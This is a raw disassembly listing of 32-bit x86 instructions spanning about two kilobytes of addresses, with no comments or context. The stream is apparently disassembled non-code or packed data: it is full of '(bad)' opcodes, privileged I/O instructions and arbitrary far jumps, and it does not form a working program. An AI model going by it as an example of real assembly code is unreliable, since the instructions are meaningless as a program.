  41d30f:	or     ecx,DWORD PTR [ecx+edi*4+0x3e]
  41d313:	mov    eax,0x2b26a171
  41d318:	enter  0xdee6,0x8b
  41d31c:	inc    ebp
  41d31d:	inc    edx
  41d31e:	jmp    0x41d2a3
  41d320:	or     edx,DWORD PTR ds:0xc6683374
  41d326:	iret   
  41d327:	rcl    bl,1
  41d329:	fdiv   DWORD PTR [ecx+edx*8-0x3f]
  41d32d:	aad    0x83
  41d32f:	dec    eax
  41d330:	movsx  ecx,ch
  41d333:	neg    BYTE PTR [eax]
  41d335:	in     al,dx
  41d336:	xor    BYTE PTR [ecx],al
  41d338:	icebp  
  41d339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d33a:	or     esi,DWORD PTR [edx]
  41d33c:	retf   
  41d33d:	ds je  0x41d339
  41d340:	xchg   ebp,eax
  41d341:	mov    dh,0x4d
  41d343:	sub    ah,BYTE PTR [ebx+0x3f90083]
  41d349:	pop    edx
  41d34a:	adc    eax,0x8c66329c
  41d34f:	dec    ebx
  41d350:	les    esi,FWORD PTR [ebp-0x575abdc4]
  41d356:	pop    edx
  41d357:	mov    bl,0x5c
  41d359:	lds    esi,FWORD PTR [ebx+0x7aaf9fb0]
  41d35f:	and    esp,DWORD PTR [ecx]
  41d361:	rcl    DWORD PTR [ecx-0x40b0d823],0x6a
  41d368:	push   ss
  41d369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d36a:	and    esi,DWORD PTR [ecx+0x9d7d8d6]
  41d370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d371:	test   DWORD PTR [edi+esi*1+0x648b3073],ebx
  41d378:	test   al,0xe8
  41d37a:	xchg   BYTE PTR [edx+0x6f],ch
  41d37d:	aad    0xf9
  41d37f:	loopne 0x41d316
  41d381:	pop    es
  41d382:	mov    esi,0x464b71b2
  41d387:	jbe    0x41d3a0
  41d389:	fst    st(0)
  41d38b:	xchg   esi,eax
  41d38c:	enter  0xbb8d,0xa
  41d390:	xchg   ebp,edx
  41d392:	aad    0xee
  41d394:	jl     0x41d403
  41d396:	(bad)  
  41d397:	scas   al,BYTE PTR es:[edi]
  41d398:	scas   eax,DWORD PTR es:[edi]
  41d399:	test   BYTE PTR [ecx+edx*4+0x33],0x19
  41d39e:	cli    
  41d39f:	aaa    
  41d3a0:	cmp    al,0x75
  41d3a2:	ins    BYTE PTR es:[edi],dx
  41d3a3:	cwde   
  41d3a4:	aam    0x46
  41d3a6:	ror    BYTE PTR [edx+0x50d856d6],1
  41d3ac:	je     0x41d3ee
  41d3ae:	sbb    BYTE PTR [edi-0x797434b4],ah
  41d3b4:	das    
  41d3b5:	jns    0x41d3e1
  41d3b7:	(bad)  
  41d3b8:	(bad)  
  41d3b9:	mov    edx,ecx
  41d3bb:	sub    DWORD PTR [ecx-0x61],0x8ddbb421
  41d3c2:	mov    bl,0x5e
  41d3c4:	or     eax,DWORD PTR [ebx+0x4239c509]
  41d3ca:	clc    
  41d3cb:	mov    bl,0x6f
  41d3cd:	js     0x41d415
  41d3cf:	sbb    ebp,DWORD PTR [esi]
  41d3d1:	sub    BYTE PTR [ecx+0x79],ch
  41d3d4:	sbb    al,0x2b
  41d3d6:	push   eax
  41d3d7:	sbb    DWORD PTR [edx-0xac9f623],esi
  41d3dd:	repz adc cl,bh
  41d3e0:	repz lahf 
  41d3e2:	push   esi
  41d3e3:	int3   
  41d3e4:	mov    cl,0xa8
  41d3e6:	jb     0x41d451
  41d3e8:	out    dx,eax
  41d3e9:	test   DWORD PTR [eax],0x5b38ccc1
  41d3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3f0:	hlt    
  41d3f1:	inc    esi
  41d3f2:	inc    edi
  41d3f3:	mov    edi,0xea2c4f47
  41d3f8:	or     BYTE PTR [ecx],dl
  41d3fa:	rcl    DWORD PTR [ebx+0x2824023],cl
  41d400:	add    esp,0x6d
  41d403:	jo     0x41d3da
  41d405:	ret    0xcb48
  41d408:	stc    
  41d409:	rcl    BYTE PTR [eax],1
  41d40b:	les    edx,FWORD PTR [edi-0x36]
  41d40e:	aas    
  41d40f:	arpl   dx,cx
  41d411:	inc    edx
  41d412:	xchg   ebp,eax
  41d413:	add    dl,al
  41d415:	push   esp
  41d416:	mov    al,ds:0x84b471c9
  41d41b:	pusha  
  41d41c:	cdq    
  41d41d:	mov    eax,0x124f232b
  41d422:	xchg   esp,eax
  41d423:	xor    esi,DWORD PTR [edx+0x71d846cc]
  41d429:	xchg   edi,eax
  41d42a:	push   ebp
  41d42b:	call   FWORD PTR [ebx+ecx*8]
  41d42e:	pop    edi
  41d42f:	rol    BYTE PTR [ecx+0x4],cl
  41d432:	ds dec esi
  41d434:	xchg   ebp,eax
  41d435:	scas   al,BYTE PTR es:[edi]
  41d436:	adc    al,0xa2
  41d438:	sahf   
  41d439:	mov    esp,0x3bd1bf1a
  41d43e:	mov    ah,0x7e
  41d440:	xor    eax,0x3101714e
  41d445:	rol    DWORD PTR [eax-0x38f40b7c],1
  41d44b:	into   
  41d44c:	adc    eax,0x74135817
  41d451:	xchg   ebp,eax
  41d452:	popa   
  41d453:	mov    esp,0x65f2f394
  41d458:	mov    eax,0x1332f138
  41d45d:	jnp    0x41d432
  41d45f:	into   
  41d460:	mov    eax,0x7443773a
  41d465:	dec    ebx
  41d466:	setl   ch
  41d469:	cli    
  41d46a:	fwait
  41d46b:	jg     0x41d4db
  41d46d:	popa   
  41d46e:	and    al,0xc5
  41d470:	mov    dh,0xaa
  41d472:	xlat   BYTE PTR ds:[ebx]
  41d473:	fdivr  DWORD PTR [eax+esi*8+0x66]
  41d477:	inc    ecx
  41d478:	mov    eax,0xba23fe57
  41d47d:	nop
  41d47e:	cmpxchg ebp,edx
  41d481:	pushf  
  41d482:	jl     0x41d440
  41d484:	dec    esp
  41d485:	test   DWORD PTR [eax],esp
  41d487:	dec    edi
  41d488:	aaa    
  41d489:	xchg   DWORD PTR [eax+0x238cb10c],eax
  41d48f:	cmp    dl,ah
  41d491:	mov    edx,0xf36db
  41d496:	call   0x8b12:0xf1a0ecbb
  41d49d:	call   0xa2b23c4c
  41d4a2:	jb     0x41d432
  41d4a4:	cdq    
  41d4a5:	icebp  
  41d4a6:	add    BYTE PTR [edx+0x68],dl
  41d4a9:	gs into 
  41d4ab:	test   eax,0x99a5f15
  41d4b0:	fnstcw WORD PTR [edx]
  41d4b2:	ds dec ebx
  41d4b4:	sub    eax,esp
  41d4b6:	add    bl,BYTE PTR [edx+esi*2-0x2007d793]
  41d4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4be:	jmp    0x17f99f7
  41d4c3:	sub    eax,DWORD PTR [edx]
  41d4c5:	pop    eax
  41d4c6:	mov    eax,ds:0x5a0ce2bb
  41d4cb:	jg     0x41d4f7
  41d4cd:	fwait
  41d4ce:	xor    eax,0x4afb683c
  41d4d3:	pop    edi
  41d4d4:	in     al,0x8c
  41d4d6:	jecxz  0x41d552
  41d4d8:	out    0x84,eax
  41d4da:	ins    DWORD PTR es:[edi],dx
  41d4db:	sbb    BYTE PTR [ecx+0x32d4de43],0x58
  41d4e2:	add    edi,0x37
  41d4e5:	arpl   cx,cx
  41d4e7:	not    BYTE PTR [esi-0x410630c7]
  41d4ed:	repnz dec esp
  41d4ef:	jbe    0x41d54e
  41d4f1:	hlt    
  41d4f2:	pop    ds
  41d4f3:	lahf   
  41d4f4:	fdivr  DWORD PTR [eax-0x4c]
  41d4f7:	aam    0x46
  41d4f9:	rcl    BYTE PTR [ebp+0x230cfdf6],cl
  41d4ff:	push   ebx
  41d500:	js     0x41d4e7
  41d502:	int    0x57
  41d504:	stos   DWORD PTR es:[edi],eax
  41d505:	aas    
  41d506:	hlt    
  41d507:	mov    al,0x97
  41d509:	mov    edi,0x736c781d
  41d50e:	mov    ch,0xa0
  41d510:	out    dx,eax
  41d511:	in     eax,dx
  41d512:	xchg   ebp,eax
  41d513:	retf   
  41d514:	pop    ss
  41d515:	cdq    
  41d516:	rcl    DWORD PTR [edi+0x22],0x84
  41d51a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d51b:	dec    eax
  41d51c:	jmp    0xd01b:0xb41dbc9f
  41d523:	sbb    bh,ah
  41d525:	xchg   edi,eax
  41d526:	mov    ?,WORD PTR [edi]
  41d528:	rcl    DWORD PTR [ecx-0x57],1
  41d52b:	mov    WORD PTR [edi+0x58],?
  41d52e:	xor    eax,0x40935cb0
  41d533:	cdq    
  41d534:	jne    0x41d516
  41d536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d537:	xor    eax,0xaa994df2
  41d53c:	das    
  41d53d:	xchg   esi,eax
  41d53e:	push   edi
  41d53f:	add    esp,eax
  41d541:	leave  
  41d542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d543:	js     0x41d523
  41d545:	mov    ds:0x9fe4e0a7,al
  41d54a:	clc    
  41d54b:	or     BYTE PTR [esi+0x51],dh
  41d54e:	cdq    
  41d54f:	inc    ebp
  41d550:	repz and eax,0xa452cc3e
  41d556:	jae    0x41d51e
  41d558:	adc    bl,bh
  41d55a:	mov    esi,DWORD PTR [esi+ebx*4]
  41d55d:	mov    bh,0xa7
  41d55f:	xchg   DWORD PTR [esi+0x4d],ebx
  41d562:	xor    edi,DWORD PTR [edi-0x30a0ff21]
  41d568:	mov    ecx,0xa2b6afc4
  41d56d:	xor    al,0xac
  41d56f:	lock pop eax
  41d571:	dec    ebp
  41d572:	cmp    ecx,esp
  41d574:	shl    BYTE PTR [eax+0x646befd5],0x3e
  41d57b:	push   ecx
  41d57c:	cmc    
  41d57d:	and    ebx,DWORD PTR [ebx-0x46]
  41d580:	test   DWORD PTR [eax],0xfc439c30
  41d586:	es sub al,0x6a
  41d589:	pop    edx
  41d58a:	sar    DWORD PTR [ecx+0x53],1
  41d58d:	mov    ebx,0xf19b585e
  41d592:	jp     0x41d573
  41d594:	(bad)  
  41d595:	push   esi
  41d596:	fwait
  41d597:	scas   al,BYTE PTR es:[edi]
  41d598:	fwait
  41d599:	(bad)  
  41d59a:	outs   dx,DWORD PTR ds:[esi]
  41d59b:	test   BYTE PTR [ebx+ebp*1+0x37168cc4],dl
  41d5a2:	leave  
  41d5a3:	jae    0x41d535
  41d5a5:	add    dl,0xab
  41d5a8:	outs   dx,DWORD PTR ds:[esi]
  41d5a9:	aam    0xca
  41d5ab:	or     eax,ecx
  41d5ad:	inc    ebp
  41d5ae:	mov    ebx,0x83567cef
  41d5b3:	shr    BYTE PTR [ebp+0xe],1
  41d5b6:	xor    edx,DWORD PTR [edx+0x54207f9]
  41d5bc:	ja     0x41d5e5
  41d5be:	pop    ebx
  41d5bf:	jo     0x41d639
  41d5c1:	cmc    
  41d5c2:	jecxz  0x41d5b9
  41d5c4:	cli    
  41d5c5:	and    BYTE PTR [ebp+eax*2+0x5a36d673],al
  41d5cc:	fidivr DWORD PTR [eax]
  41d5ce:	lods   al,BYTE PTR ds:[esi]
  41d5cf:	mov    edx,0xad1836be
  41d5d4:	sbb    DWORD PTR [ecx-0x41d74035],esi
  41d5da:	sub    esp,esi
  41d5dc:	xlat   BYTE PTR ds:[ebx]
  41d5dd:	pop    edx
  41d5de:	sar    BYTE PTR [eax-0x6548788c],0x9f
  41d5e5:	push   ebx
  41d5e6:	out    dx,eax
  41d5e7:	sbb    al,0x53
  41d5e9:	pusha  
  41d5ea:	and    eax,0xa1acaf1a
  41d5ef:	dec    esi
  41d5f0:	mov    cl,0x29
  41d5f2:	clc    
  41d5f3:	mov    bh,bl
  41d5f5:	fdivr  DWORD PTR [ebx]
  41d5f7:	inc    esp
  41d5f8:	mov    ds:0xf64d8c0,eax
  41d5fd:	pop    edx
  41d5fe:	stos   BYTE PTR es:[edi],al
  41d5ff:	fs xchg ebp,eax
  41d601:	jl     0x41d642
  41d603:	xchg   ebp,eax
  41d604:	xor    dh,dh
  41d606:	cmp    ch,dh
  41d608:	dec    ecx
  41d609:	and    esi,DWORD PTR [esi+0x765a4ac1]
  41d60f:	add    BYTE PTR [ecx+0x75],dh
  41d612:	jge    0x41d67e
  41d614:	aad    0xc1
  41d616:	inc    edx
  41d617:	dec    ebp
  41d618:	push   eax
  41d619:	xor    eax,0x625b9331
  41d61e:	lock sub al,cl
  41d621:	mov    eax,0x282a8cb9
  41d626:	jl     0x41d667
  41d628:	jbe    0x41d63b
  41d62a:	push   ecx
  41d62b:	mov    ebp,eax
  41d62d:	push   edx
  41d62e:	push   ebp
  41d62f:	push   edx
  41d630:	call   0x98f5f976
  41d635:	push   eax
  41d636:	pop    esi
  41d637:	cwde   
  41d638:	mov    cl,cl
  41d63a:	call   0xcabe:0x5d414ccb
  41d641:	push   ds
  41d642:	mov    bl,0x83
  41d644:	cmp    ecx,DWORD PTR [ebx+0x4a]
  41d647:	cmp    ebx,DWORD PTR [edi-0x12fabdf8]
  41d64d:	in     al,0xfe
  41d64f:	mov    dh,0x41
  41d651:	call   0xdfcc08cb
  41d656:	mov    ds,WORD PTR [edi+0x41]
  41d659:	xor    DWORD PTR [eax+esi*2+0x3280fbd0],0xf26f4daa
  41d664:	mov    bh,0x99
  41d666:	mov    bl,0xf5
  41d668:	(bad)  
  41d669:	out    0xa4,al
  41d66b:	fbld   TBYTE PTR [ebp+0x16]
  41d66e:	add    DWORD PTR [edi-0x79],edx
  41d671:	or     DWORD PTR [esi-0x18],0x485f1fc9
  41d678:	push   0x4168f56b
  41d67d:	dec    edi
  41d67e:	fadd   QWORD PTR [ecx+0xac33f8e]
  41d684:	jl     0x41d61f
  41d686:	mov    al,ds:0xe9c7a832
  41d68b:	pop    ebx
  41d68c:	cld    
  41d68d:	ffree  st(1)
  41d68f:	and    al,0x3d
  41d691:	xchg   BYTE PTR [eax-0x39],ah
  41d694:	imul   esp,ebx,0xffffffb2
  41d697:	sub    al,0x80
  41d699:	sbb    al,0x73
  41d69b:	xchg   edi,eax
  41d69c:	(bad)
  41d6a0:	addr16 je 0x41d675
  41d6a3:	sbb    cl,bl
  41d6a5:	or     al,0x49
  41d6a7:	pop    edi
  41d6a8:	jnp    0x41d70b
  41d6aa:	mov    DWORD PTR [eax],edi
  41d6ac:	dec    ebp
  41d6ad:	icebp  
  41d6ae:	lock jnp 0x41d635
  41d6b1:	pop    edx
  41d6b2:	sbb    ebx,DWORD PTR [edx]
  41d6b4:	adc    BYTE PTR [eax-0x41cbff6a],bl
  41d6ba:	nop
  41d6bb:	pop    esp
  41d6bc:	ficom  DWORD PTR [ecx-0x18]
  41d6bf:	inc    ecx
  41d6c0:	sub    al,0x4e
  41d6c2:	mov    cl,0x2c
  41d6c4:	dec    esi
  41d6c5:	ins    DWORD PTR es:[edi],dx
  41d6c6:	pop    ss
  41d6c7:	repz inc edx
  41d6c9:	frndint 
  41d6cb:	mov    bh,0xfe
  41d6cd:	or     eax,0x60a6cc24
  41d6d2:	jge    0x41d70d
  41d6d4:	push   ds
  41d6d5:	rcr    DWORD PTR [edx+eiz*4],cl
  41d6d8:	call   FWORD PTR [esi]
  41d6da:	imul   edx,esp,0xd859d573
  41d6e0:	push   edi
  41d6e1:	ja     0x41d668
  41d6e3:	aam    0x30
  41d6e5:	es push es
  41d6e7:	xchg   ebp,eax
  41d6e8:	adc    cl,al
  41d6ea:	shl    BYTE PTR [edi],cl
  41d6ec:	mov    eax,0x57670600
  41d6f1:	enter  0x7c4c,0xa6
  41d6f5:	jbe    0x41d700
  41d6f7:	cmp    ecx,esi
  41d6f9:	out    dx,al
  41d6fa:	enter  0x3979,0xcc
  41d6fe:	and    eax,0x849fb727
  41d703:	xor    BYTE PTR [ecx+ecx*8],al
  41d706:	cwde   
  41d707:	idiv   BYTE PTR [eax-0x64]
  41d70a:	je     0x41d766
  41d70c:	mov    ah,0x83
  41d70e:	sbb    DWORD PTR ds:0xc6584a83,ebx
  41d714:	ficomp WORD PTR [edi]
  41d716:	outs   dx,DWORD PTR ds:[esi]
  41d717:	(bad)  
  41d718:	mov    esi,0x8613dd28
  41d71d:	call   0xc2b16a0
  41d722:	cmc    
  41d723:	or     al,0x57
  41d725:	test   eax,0xa6f261d9
  41d72b:	rcr    BYTE PTR [edi-0x47],1
  41d72e:	imul   ecx,esp,0x3
  41d731:	pop    ds
  41d732:	rcr    DWORD PTR [ecx+0x20d3c84e],1
  41d738:	and    DWORD PTR [edx],esp
  41d73a:	in     eax,dx
  41d73b:	xchg   DWORD PTR [esi+edx*8+0x760d12a7],ebp
  41d742:	mov    esi,0x20d2f416
  41d747:	cs daa 
  41d749:	jecxz  0x41d6fd
  41d74b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d74c:	jmp    0x17ae66c
  41d751:	inc    ebp
  41d752:	cs aas 
  41d754:	jge    0x41d743
  41d756:	pop    ecx
  41d757:	xchg   ecx,eax
  41d758:	iret   
  41d759:	mov    dl,0x22
  41d75b:	adc    bh,dl
  41d75d:	addr16 cmp edx,esp
  41d760:	mov    ebx,0x81025d3f
  41d765:	sub    al,0xe0
  41d767:	xchg   edx,eax
  41d768:	dec    eax
  41d769:	or     eax,0x15
  41d76c:	push   ecx
  41d76d:	pop    edi
  41d76e:	jnp    0x41d799
  41d770:	retf   
  41d771:	pop    esp
  41d772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d773:	pop    ebp
  41d774:	imul   eax,DWORD PTR [esp+edx*1+0x42],0xffffff85
  41d779:	sbb    ecx,0xcffc56ff
  41d77f:	sbb    dh,BYTE PTR [ebx-0xe970355]
  41d785:	jle    0x41d78f
  41d787:	(bad)  
  41d788:	jmp    0x41d7c1
  41d78a:	or     BYTE PTR [ebx+edx*2-0x16],ch
  41d78e:	inc    ecx
  41d78f:	iret   
  41d790:	sub    BYTE PTR [ecx+0x3a8e41b7],ah
  41d796:	enter  0x72b,0x3a
  41d79a:	out    0x51,eax
  41d79c:	mov    ebx,0xb4eefba9
  41d7a1:	lahf   
  41d7a2:	mov    WORD PTR [edi-0x340e741d],es
  41d7a8:	sbb    esi,DWORD PTR [edi-0x67]
  41d7ab:	leave  
  41d7ac:	add    eax,0x45f7894
  41d7b1:	iret   
  41d7b2:	data16 xor BYTE PTR [esi-0x34],0x59
  41d7b7:	js     0x41d73c
  41d7b9:	mov    ch,0xc9
  41d7bb:	ds mov dh,0x6a
  41d7be:	inc    ecx
  41d7bf:	sub    ch,ah
  41d7c1:	or     ch,al
  41d7c3:	xor    al,0x2b
  41d7c5:	js     0x41d78a
  41d7c7:	ss push ecx
  41d7c9:	jge    0x41d781
  41d7cb:	dec    edx
  41d7cc:	fst    QWORD PTR [edi-0x24ef9697]
  41d7d2:	leave  
  41d7d3:	or     al,0x6c
  41d7d5:	jae    0x41d7db
  41d7d7:	imul   eax,DWORD PTR [esi+ebx*2-0x5e],0xc09837bf
  41d7df:	in     al,dx
  41d7e0:	mov    al,0xeb
  41d7e2:	mov    edi,0x67d70c0f
  41d7e7:	fs in  al,0x7f
  41d7ea:	sub    dh,BYTE PTR [edi+eiz*1]
  41d7ed:	retf   0x8e2c
  41d7f0:	into   
  41d7f1:	dec    eax
  41d7f2:	sahf   
  41d7f3:	cli    
  41d7f4:	cld    
  41d7f5:	add    bh,al
  41d7f7:	arpl   bp,sp
  41d7f9:	es inc ecx
  41d7fb:	pop    ebp
  41d7fc:	call   0x6d80:0xa44e6c6b
  41d803:	fmul   QWORD PTR [ebp-0x6f1bdc70]
  41d809:	and    al,0x41
  41d80b:	(bad)  
  41d80c:	addr16 mov ch,0x3d
  41d80f:	shl    BYTE PTR [edi-0x67],0xb2
  41d813:	xor    BYTE PTR [edi-0x50],ah
  41d816:	adc    BYTE PTR [ebx],0x9
  41d819:	jg     0x41d858
  41d81b:	and    al,0xbb
  41d81d:	popa   
  41d81e:	daa    
  41d81f:	mov    esi,0x7a6d22f
  41d824:	popa   
  41d825:	add    DWORD PTR [edx-0x294f4a18],edi
  41d82b:	pop    esi
  41d82c:	sub    BYTE PTR [ebx],0xe2
  41d82f:	ins    DWORD PTR es:[edi],dx
  41d830:	loope  0x41d7fa
  41d832:	push   0x12
  41d834:	dec    edx
  41d835:	addr16 xchg edx,eax
  41d837:	aam    0x34
  41d839:	out    dx,eax
  41d83a:	in     eax,dx
  41d83b:	retf   0x9b7f
  41d83e:	pop    edi
  41d83f:	xor    al,0xf5
  41d841:	adc    ebp,eax
  41d843:	rcl    DWORD PTR [edi],cl
  41d845:	pop    es
  41d846:	idiv   cl
  41d848:	shr    BYTE PTR [ecx-0x4931267],0x92
  41d84f:	push   esi
  41d850:	stos   DWORD PTR es:[edi],eax
  41d851:	and    DWORD PTR [edi-0x20a01dd0],0xe9b0671e
  41d85b:	sar    DWORD PTR [esi-0x8],cl
  41d85e:	mov    ebp,0x5c2846c2
  41d863:	aad    0xcc
  41d865:	push   eax
  41d866:	rcl    BYTE PTR [edi+ebp*1-0x11],cl
  41d86a:	sar    BYTE PTR [ebx-0x799c49dd],1
  41d870:	dec    esi
  41d871:	dec    esi
  41d872:	dec    eax
  41d873:	xor    ch,cl
  41d875:	jmp    0x67f54700
  41d87a:	leave  
  41d87b:	inc    eax
  41d87c:	add    DWORD PTR [eax-0x29ad06fc],0xa6fafa1b
  41d886:	xchg   DWORD PTR [edi],ecx
  41d888:	dec    esp
  41d889:	loop   0x41d813
  41d88b:	int    0xf0
  41d88d:	cmp    al,0xf1
  41d88f:	out    dx,al
  41d890:	cmp    DWORD PTR [eax],eax
  41d892:	out    dx,al
  41d893:	clc    
  41d894:	data16 mov ss,WORD PTR [eax-0x53b7b55a]
  41d89b:	inc    edi
  41d89c:	in     eax,0xb2
  41d89e:	jp     0xe09d76da
  41d8a4:	int    0x37
  41d8a6:	mov    bh,0xa7
  41d8a8:	mov    al,0x20
  41d8aa:	dec    edx
  41d8ab:	into   
  41d8ac:	scas   al,BYTE PTR es:[edi]
  41d8ad:	sbb    bh,0x35
  41d8b0:	pop    ebx
  41d8b1:	or     DWORD PTR [ebp+0x7d],eax
  41d8b4:	inc    ebp
  41d8b5:	jmp    0xb609:0x1f8b0512
  41d8bc:	loopne 0x41d85e
  41d8be:	xor    DWORD PTR [eax-0x1a],eax
  41d8c1:	sub    BYTE PTR [eax+0x13603e10],cl
  41d8c7:	sahf   
  41d8c8:	mov    edx,0x97979e41
  41d8cd:	and    ch,BYTE PTR [ebp+0x7a]
  41d8d0:	add    al,0x2e
  41d8d2:	xlat   BYTE PTR ds:[ebx]
  41d8d3:	inc    ebx
  41d8d4:	cmp    ah,dl
  41d8d6:	ins    DWORD PTR es:[edi],dx
  41d8d7:	inc    esp
  41d8d8:	xchg   edx,eax
  41d8d9:	ret    0x3505
  41d8dc:	adc    eax,0x4658de05
  41d8e1:	lock dec edx
  41d8e3:	jbe    0x41d887
  41d8e5:	xor    BYTE PTR [edi],cl
  41d8e7:	push   ecx
  41d8e8:	in     al,dx
  41d8e9:	cmp    eax,0xd28fa0ad
  41d8ee:	imul   esi,ecx,0x4
  41d8f1:	lods   eax,DWORD PTR ds:[esi]
  41d8f2:	rep lods al,BYTE PTR ds:[esi]
  41d8f4:	add    al,0x33
  41d8f6:	dec    edx
  41d8f7:	clc    
  41d8f8:	adc    al,0x21
  41d8fa:	cmp    eax,0xf55af204
  41d8ff:	icebp  
  41d900:	adc    dh,BYTE PTR [ecx-0x3500f114]
  41d906:	sbb    eax,0x6785de0d
  41d90b:	cs sbb esp,edx
  41d90e:	(bad)  
  41d90f:	jnp    0x41d926
  41d911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d912:	mov    cl,0xc1
  41d914:	retf   0x3d2
  41d917:	pop    ds
  41d918:	loopne 0x41d903
  41d91a:	cmp    BYTE PTR [eax-0x555a94ab],dl
  41d920:	(bad)  
  41d921:	out    0x6b,eax
  41d923:	pop    es
  41d924:	aas    
  41d925:	sbb    eax,0x29470b7a
  41d92a:	jge    0x41d975
  41d92c:	mov    eax,DWORD PTR [eax]
  41d92e:	sbb    bl,0x13
  41d931:	popa   
  41d932:	sbb    BYTE PTR [ecx],bl
  41d934:	mov    esi,DWORD PTR [eax-0x27]
  41d937:	mov    ds:0xcfee16bd,eax
  41d93c:	mov    ebx,0xf9ebf183
  41d941:	mov    edx,0xedefe0e3
  41d946:	inc    esi
  41d947:	cli    
  41d948:	fs out 0x83,al
  41d94b:	mov    edi,0x51f6eaa8
  41d950:	push   0x4a14c400
  41d955:	dec    esp
  41d956:	dec    ebx
  41d957:	adc    eax,0xc450d36e
  41d95c:	xor    ecx,DWORD PTR [ebx-0x5e]
  41d95f:	inc    esp
  41d960:	or     BYTE PTR [ebx-0x1eb429b3],dl
  41d966:	out    dx,al
  41d967:	stc    
  41d968:	cmp    al,0x15
  41d96a:	popa   
  41d96b:	mov    bh,0x8c
  41d96d:	jmp    0x41d931
  41d96f:	adc    al,BYTE PTR gs:[ecx+0x47]
  41d973:	jge    0x41d9d4
  41d975:	dec    edi
  41d976:	sub    DWORD PTR [esp+ebx*1],esi
  41d979:	dec    eax
  41d97a:	into   
  41d97b:	aaa    
  41d97c:	mov    ds:0x8dc47044,eax
  41d981:	inc    edx
  41d982:	and    BYTE PTR [ecx],dl
  41d984:	es jecxz 0x41d98e
  41d987:	mov    ah,0xe3
  41d989:	rol    BYTE PTR [esi+0x4b271784],0xd9
  41d990:	inc    ecx
  41d991:	call   0x377e9340
  41d996:	xchg   esi,eax
  41d997:	test   BYTE PTR [eax+0x52336d73],dl
  41d99d:	je     0x41d9b8
  41d99f:	sub    BYTE PTR [edx-0x696a49ae],ah
  41d9a5:	lods   eax,DWORD PTR ds:[esi]
  41d9a6:	nop
  41d9a7:	xor    al,0x65
  41d9a9:	scas   eax,DWORD PTR es:[edi]
  41d9aa:	inc    eax
  41d9ab:	xor    al,dh
  41d9ad:	adc    eax,0xae806f1
  41d9b2:	shl    DWORD PTR [esi+ecx*8-0x3],0xa1
  41d9b7:	mov    ds:0x433bbf17,al
  41d9bc:	icebp  
  41d9bd:	iret   
  41d9be:	popa   
  41d9bf:	add    al,0x4c
  41d9c1:	mov    bh,0x41
  41d9c3:	(bad)  
  41d9c4:	popa   
  41d9c5:	test   BYTE PTR [esi],bl
  41d9c7:	lahf   
  41d9c8:	xchg   edx,eax
  41d9c9:	push   ds
  41d9ca:	pop    esp
  41d9cb:	and    BYTE PTR [edx],ch
  41d9cd:	push   0xfffffffa
  41d9cf:	enter  0x13fd,0xad
  41d9d3:	jecxz  0x41d964
  41d9d5:	cmp    eax,0x70c977b1
  41d9da:	(bad)  [edx+0x390da5af]
  41d9e0:	repnz outs dx,BYTE PTR ds:[esi]
  41d9e2:	nop
  41d9e3:	sbb    dl,BYTE PTR [edx]
  41d9e5:	push   edx
  41d9e6:	mov    bh,0x2f
  41d9e8:	push   ss
  41d9e9:	jp     0x41da2e
  41d9eb:	sti    
  41d9ec:	fist   WORD PTR [edi]
  41d9ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9ef:	outs   dx,DWORD PTR ds:[esi]
  41d9f0:	aam    0xb4
  41d9f2:	mov    esp,0x635cc31a
  41d9f7:	cmp    eax,0xebaf9b8a
  41d9fc:	xor    cl,0x89
  41d9ff:	xchg   ebx,eax
  41da00:	inc    DWORD PTR [esi+0x5b99f06b]
  41da06:	ja     0x41da55
  41da08:	scas   eax,DWORD PTR es:[edi]
  41da09:	es inc esi
  41da0b:	aas    
  41da0c:	mov    DWORD PTR [eax],ecx
  41da0e:	loopne 0x41da55
  41da10:	mov    eax,esp
  41da12:	hlt    
  41da13:	iret   
  41da14:	repz std 
  41da16:	aas    
  41da17:	bnd jmp 0x41d9b1
  41da1a:	fadd   QWORD PTR [edx]
  41da1c:	push   edi
  41da1d:	adc    esp,DWORD PTR [edi]
  41da1f:	sub    eax,0x60dbaeb4
  41da24:	nop
  41da25:	inc    edx
  41da26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da27:	jae    0x41d9e5
  41da29:	outs   dx,DWORD PTR ds:[esi]
  41da2a:	adc    dl,bl
  41da2c:	jnp    0x41da52
  41da2e:	xor    DWORD PTR [ebx],esi
  41da30:	and    DWORD PTR [edi+0x2fe12436],ebx
  41da36:	fwait
  41da37:	scas   eax,DWORD PTR es:[edi]
  41da38:	push   edx
  41da39:	stos   DWORD PTR es:[edi],eax
  41da3a:	pop    esi
  41da3b:	pop    edi
  41da3c:	mov    ah,0x64
  41da3e:	cmp    ebx,DWORD PTR [esi-0x13d3be47]
  41da44:	sti    
  41da45:	inc    ebx
  41da46:	sbb    eax,0xbf0bf904
  41da4b:	sub    ecx,DWORD PTR [edi]
  41da4d:	inc    eax
  41da4e:	push   0xffffffbc
  41da50:	int3   
  41da51:	jmp    0x41d9ef
  41da53:	out    dx,eax
  41da54:	ret    
  41da55:	call   0x7b0e:0x2c1afd36
  41da5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da5d:	xchg   edi,eax
  41da5e:	ret    
  41da5f:	or     BYTE PTR [ebp+0x1c],ch
  41da62:	or     BYTE PTR [esi+0x46],dh
  41da65:	lds    eax,FWORD PTR [ebp+edi*8+0x6c25e560]
  41da6c:	retw   
  41da6e:	jne    0x41da7b
  41da70:	dec    esp
  41da71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da72:	dec    edx
  41da74:	or     DWORD PTR [ebp+0x5dcd415f],edi
  41da7a:	mov    bl,0x58
  41da7c:	stos   DWORD PTR es:[edi],eax
  41da7d:	lock cli 
  41da7f:	cvtps2pd xmm0,xmm1
  41da82:	cwde   
  41da83:	jmp    0x41da77
  41da85:	pop    ebx
  41da86:	call   FWORD PTR [edi]
